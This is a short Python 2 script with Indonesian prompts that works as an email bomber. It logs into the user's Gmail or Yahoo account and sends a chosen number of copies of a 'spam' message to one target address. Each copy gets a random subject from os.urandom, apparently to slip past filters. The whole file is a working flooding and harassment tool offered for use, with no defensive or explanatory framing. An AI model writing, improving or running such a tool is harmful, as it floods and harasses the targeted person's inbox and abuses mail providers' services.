#!/usr/bin/python


import os
import smtplib
import getpass
import sys


server = raw_input ('Pilih Gmail/Yahoo?: ')
user = raw_input('[?] Email Lu : ')
passwd = getpass.getpass('[?] Password : ')


to = raw_input('\n[?] Masukan Email Target : ')
#subject = raw_input('Subject: ') 
body = raw_input('[?] Isi Spam : ')
total = input('[?] Jumlah : ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Applies only to gmail and yahoo.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rE-mails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n [!] Sukses '
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] Mungkin Nama Pengguna Dan Sandi Email Anda Salah'
    sys.exit()
